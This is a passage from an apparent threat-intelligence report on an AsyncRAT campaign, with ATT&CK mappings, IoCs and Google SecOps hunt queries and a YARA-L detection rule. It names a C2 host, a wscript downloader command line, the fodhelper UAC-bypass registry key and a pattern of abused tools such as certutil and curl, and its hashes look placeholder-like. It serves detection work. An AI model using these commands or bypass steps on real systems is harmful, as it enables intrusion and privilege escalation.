- **Observed Artifact / Command:** `TLS -> async-rat-node04.ddns.net:6606`

---

## 3. MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Operational Context |
| :--- | :--- | :--- | :--- |
| **Defense Evasion** | `T1027.006` | Obfuscated Files or Information: HTML Smuggling | Uses SVG/HTML Blob smuggling to bypass email gateway inspection. |
| **Execution** | `T1059.007` | Command and Scripting Interpreter: JavaScript | Executes JScript stage-1 downloader via wscript.exe. |
| **Privilege Escalation** | `T1548.002` | Abuse Elevation Control Mechanism: Bypass User Account Control | Abuses fodhelper.exe auto-elevation behavior. |

---

## 4. Indicators of Compromise (IoCs)

### File Hashes
| Algorithm | Hash Value | Associated File |
| :--- | :--- | :--- |
| SHA-256 | `4a8812c90e3412b780d912f45c612a90e8412b309c7712e4509a12d84f9011cc` | `AsyncClient_stub.exe` |
| MD5 | `6b1209f44a712c90e3412b88a0912d19` | `verify_invoice.js` |

### Network Indicators
| Type | Indicator | Context |
| :--- | :--- | :--- |
| IPv4 | `94.156.71.108` | AsyncRAT C2 Listener (TCP/6606) |
| Domain | `async-rat-node04.ddns.net` | Dynamic DNS C2 Hostname (TLS/6606) |

### Host & System Artifacts
| Artifact Type | Value | Description |
| :--- | :--- | :--- |
| Command Line | `wscript.exe //B //E:JScript "E:\verify_invoice.js"` | JScript execution from mounted ISO image |
| Registry Key | `HKCU\Software\Classes\ms-settings\Shell\Open\command` | Fodhelper UAC bypass registry key |
| Mutex | `AsyncMutex_6SI8OkPnk` | Default AsyncRAT client mutex |

---

## 5. Google SecOps (Chronicle) Threat Hunting & Detection

### 5.1 UDM IoC Sweep Query
```sql
// Google SecOps UDM Multi-Surface IoC Sweep: AsyncRAT & Vidar Loader Campaign Abusing Signed Cloud Tunnel Binaries in Healthcare & Retail
metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP", "PROCESS_LAUNCH", "FILE_CREATION")
(
  target.ip in ("94.156.71.108") or
  principal.ip in ("94.156.71.108") or
  network.dns.questions.name in ("async-rat-node04.ddns.net") or
  target.hostname in ("async-rat-node04.ddns.net") or
  target.file.sha256 in ("4a8812c90e3412b780d912f45c612a90e8412b309c7712e4509a12d84f9011cc") or
  principal.process.file.sha256 in ("4a8812c90e3412b780d912f45c612a90e8412b309c7712e4509a12d84f9011cc") or
  target.file.md5 in ("6b1209f44a712c90e3412b88a0912d19")
)
```

### 5.2 UDM Behavioral / Attack Pattern Hunt Query
```sql
// Google SecOps UDM Behavioral Hunt: AsyncRAT
metadata.event_type in ("PROCESS_LAUNCH", "REGISTRY_MODIFICATION", "FILE_CREATION", "SCHEDULED_TASK_CREATION")
(
  target.process.command_line = /.*wscript\.exe.*/ nocase or
  target.registry.registry_key = /.*command.*/ nocase
)
principal.user.userid != "SYSTEM"
```

### 5.3 YARA-L 2.0 Detection Rule (`asyncrat_vidar_loader_campaign_abusing_signe_ti2024`)
```yara
rule asyncrat_vidar_loader_campaign_abusing_signe_ti2024 {
  meta:
    author = "Google SecOps Detection Engineering"
    description = "Detects execution artifacts and C2 communication associated with AsyncRAT & Vidar Loader Campaign Abusing Signed Cloud Tunnel Binaries in Healthcare & Retail"
    severity = "MEDIUM"
    priority = "MEDIUM"
    mitre_attack = "T1027.006, T1059.007, T1548.002"
    cve_references = "CVE-2024-38021"
    threat_actor = "TA577 / AsyncRAT Operators"
    malware_family = "AsyncRAT"

  events:
    $proc.metadata.event_type in ("PROCESS_LAUNCH", "FILE_CREATION", "REGISTRY_MODIFICATION")
    $proc.principal.hostname = $hostname
    (
      $proc.target.file.sha256 in ("4a8812c90e3412b780d912f45c612a90e8412b309c7712e4509a12d84f9011cc") nocase or
      $proc.target.process.command_line = /.*(powershell|rundll32|wmic|vssadmin|schtasks|curl|certutil).*/ nocase
    )

    $net.metadata.event_type in ("NETWORK_CONNECTION", "NETWORK_DNS", "NETWORK_HTTP")
    $net.principal.hostname = $hostname
    (
      $net.target.ip in ("94.156.71.108") or
      $net.network.dns.questions.name in ("async-rat-node04.ddns.net") nocase
    )

  match:
    $hostname over 15m

  outcome:
    $risk_score = max(60)
    $mitre_techniques = array_distinct("T1027.006, T1059.007, T1548.002")
    $affected_host = array_distinct($hostname)
    $principal_user = array_distinct($proc.principal.user.userid)
    $command_lines = array_distinct($proc.target.process.command_line)
    $contacted_c2 = array_distinct(coalesce($net.network.dns.questions.name, $net.target.ip))

  condition:
    $proc and $net
}
```
